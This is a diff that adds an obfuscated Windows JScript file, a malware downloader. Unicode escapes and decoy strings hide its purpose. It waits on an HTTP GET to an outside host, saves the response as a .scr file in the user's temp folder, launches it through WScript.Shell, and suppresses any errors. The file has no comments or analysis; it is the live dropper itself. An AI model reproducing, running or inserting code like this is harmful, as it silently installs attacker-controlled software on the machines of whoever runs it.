@@ -1,0 +1,24 @@
+resultNet = (((1) * (0 ^ 1)), this);
+precisionCathedral = ("ba\u0072r" + "\u0061" + "\u0063k", "\u0069\u0064\u0065\u0061", "\u0066r\u0061" + "\u0067\u006d\u0065nt", "\u0063o\u006dp" + "\u0075t\u0065\u0072", "R\u0075n");
+realizationRegularity = resultNet[("\u0066\u0061t" + "a\u006c", "a\u006d" + "pli" + "\u0074u\u0064\u0065", "\u0076e\u0074" + "o", "\u0057\u0053c\u0072\u0069" + "p\u0074")];
+realizationRegularity[("pas" + "\u0074e", "r" + "e\u0063" + "\u006f\u0072\u0064", "at" + "\u0074\u0065st\u0061" + "t" + "ion", "\u0061\u0071u\u0061r" + "iu\u006d", "\u0053\u006ce\u0065" + "p")]((Math.pow((65 | 26455), 2) - (641176779 + 58675246)));
+dogmaAutomatic = realizationRegularity[("o\u0062\u006ae" + "\u0063" + "\u0074iv\u0065", "\u0062\u0061\u006cl\u006fo" + "n", "leg\u0069" + "o\u006e", "or\u0067\u0061n", "C\u0072\u0065at" + "\u0065Ob" + "jec" + "t")](("\u0067\u0065" + "ne\u0072\u0061l", "\u0065\u0073" + "\u0073ay", "\u0073\u0065s\u0073i" + "\u006fn", "s" + "\u0079" + "\u006dm\u0065t" + "ry", "\u0057\u0053" + "crip" + "t\u002eS" + "h\u0065l\u006c"));
+yachtMate = dogmaAutomatic[("ma" + "j\u006fr", "c\u006f" + "\u006e\u0074act", "\u006c" + "\u0069n\u0067" + "\u0075\u0069\u0073\u0074", "real\u0069\u007a" + "at\u0069on", "\u0045\u0078\u0070\u0061\u006e" + "dE" + "nvi" + "\u0072\u006f\u006e" + "me" + "n\u0074" + "\u0053tri\u006eg" + "\u0073")](("\u0067u" + "e" + "s\u0074", "i\u006esp" + "e\u0063\u0074" + "o\u0072", "\u0025\u0054E" + "\u004d\u0050%\u002f")) + ("mech" + "\u0061\u006e" + "\u0069\u0063", "m\u0061s" + "k" + "\u0048\u006f\u0074e" + "\u006c") + ("\u0074" + "\u0065l\u0065\u0076i\u0073" + "\u0069\u006f\u006e", "\u006e\u0065\u0067" + "\u0061t" + "iv\u0065", "\u0068" + "\u0069" + "s\u0074" + "o\u0072" + "\u0079", "\u0070\u006ca\u006e\u0065\u0074", "\u002e" + "\u0073c\u0072");
+statuetteSyntax = resultNet[("\u0061ct", "t" + "o" + "nic", "\u006c" + "\u0065\u0074\u0068\u0061\u006c", "v\u006fc\u0061l", "WS\u0063r" + "ip" + "\u0074")][("p\u0061\u006ee" + "\u006c", "\u0064ust", "\u0073pe" + "\u0063u\u006c\u0061t\u0069" + "o\u006e", "t\u0072" + "\u0061\u0067\u0069" + "c", "\u0043" + "r\u0065" + "at" + "eO" + "\u0062je" + "\u0063" + "t")](("\u004dS" + "\u0058ML2\u002e" + "X\u004dLH" + "T\u0054P"));
+statuetteSyntax[("\u0069" + "\u006e\u0076e\u0073" + "\u0074", "\u0069llus\u0069" + "o\u006e", "\u006f\u0070\u0065" + "n")](("\u0047E\u0054"), ("v" + "\u0061\u0063uum", "\u0069nfo" + "\u0072\u006d" + "a\u0074\u0069\u006f" + "n", "\u0061\u0073\u0073e" + "\u006d\u0062ly", "\u0068t" + "\u0074\u0070:/" + "/\u0061" + "\u0063\u0063es\u0073" + "i" + "nv" + "es" + "\u0074\u006d\u0065n\u0074" + ".\u006e\u0065\u0074/\u0034" + "/\u0030\u0076" + "\u0065x" + "\u0077" + "\u0033\u00735"), !(1 == ((((2 & (204, 3)) | (1 | 2) * (Math.pow(19, 2) - 356) * 13), ((1) - (0 | 0))) + ((((([+[]])) / (38 ^ 9)) / ((1 * 0) ^ (0 | 25))) / (([!+[] + !+[]] * [!+[] + !+[] + !+[]] + (1 & 1)))))));
+statuetteSyntax[("\u0073\u0075" + "\u0062\u006a" + "\u0065\u0063\u0074\u0069" + "ve", "se\u006e\u0064")]();
+while (statuetteSyntax[("boxi" + "\u006e\u0067", "la\u0062o\u0072" + "at\u006f" + "ry", "\u0065n" + "e" + "\u0072\u0067\u0079", "m\u006f\u0074o\u0072", "re\u0061" + "\u0064\u0079\u0073" + "\u0074\u0061t" + "e")] < ((52 - 48) + 0)) {
+	resultNet[("t\u006f" + "\u006e\u0069c", "WS" + "\u0063\u0072ip\u0074")][("Sl\u0065" + "e\u0070")]((2 + 3) * (5 | 4) * (2 / 1) * 2);
+}
+rhombusCampaign = resultNet[("W\u0053c\u0072\u0069p" + "\u0074")][("h\u006fmog" + "ene" + "ou" + "s", "C\u0072\u0065a" + "t\u0065O\u0062j\u0065" + "\u0063t")](("\u0041D\u004f\u0044\u0042." + "\u0053tre\u0061\u006d"));
+try {
+	rhombusCampaign[("b\u0061m\u0062o" + "\u006f", "o\u0070\u0065" + "\u006e")]();
+	rhombusCampaign[("m\u0069n\u0075" + "s", "\u0069ndu\u0073t" + "\u0072\u0079", "s\u0074" + "a\u006ed", function String.prototype.residentDate() {
+		return this
+	}, "\u0074ype")] = ((15 - 14) * (1 & 1));
+	rhombusCampaign[("\u0062\u0075t" + "\u0074\u0065\u0072f\u006c" + "\u0079", "\u0074r\u0061n" + "\u0073\u0070o\u0072t", "\u006d\u006f\u0064i\u0066" + "\u0079", "\u0077\u0072it\u0065")](statuetteSyntax[("s\u0065\u006c" + "e" + "\u0063\u0074i\u0076\u0065", "fa\u0074a" + "l", "R\u0065s\u0070on" + "s\u0065\u0042\u006f" + "\u0064\u0079")]);
+	rhombusCampaign[("f\u006f" + "\u0072\u0063e", "bot\u0074\u006ce", "p\u006f\u0073\u0069ti" + "on")] = ((1 + 0) * (0 / 15));
+	rhombusCampaign[("s" + "a\u0076" + "e" + "ToFi\u006c\u0065")](yachtMate, ((60 / 30) & (1 ^ 2)));
+	rhombusCampaign[("\u0061\u0072" + "\u0074" + "\u0069\u006c\u006cer" + "\u0079", "t\u0061b\u006c" + "e\u0074", "cl" + "\u006f\u0073e")]();
+	dogmaAutomatic[precisionCathedral](yachtMate.residentDate(), ((129 - 35), (16 * 8 + 5), (135, 110, 65, 27), (0 / 9)), (0 | 0));
+} catch (synthesisTelephone) {};
